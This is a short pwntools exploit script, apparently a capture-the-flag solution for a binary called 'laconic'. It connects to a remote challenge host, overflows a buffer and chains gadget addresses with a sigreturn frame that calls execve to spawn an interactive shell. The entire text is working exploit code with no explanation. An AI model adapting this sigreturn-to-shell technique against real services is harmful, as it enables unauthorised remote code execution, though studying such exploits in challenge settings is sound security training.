from pwn import *

elf = ELF("./laconic_patched")

context.binary = elf

# p = process()
# gdb.attach(p)
p = remote("94.237.59.30", 41995)

syscall = 0x0000000000043015

srop = SigreturnFrame()
srop.rdi = 0x43238
srop.rax = 59
srop.rip = 0x0000000000043015

payload = b'a' * 8 + pack(0x0000000000043018) + pack(15) + pack(0x0000000000043015) + bytes(srop)

p.sendline(payload)

p.interactive()
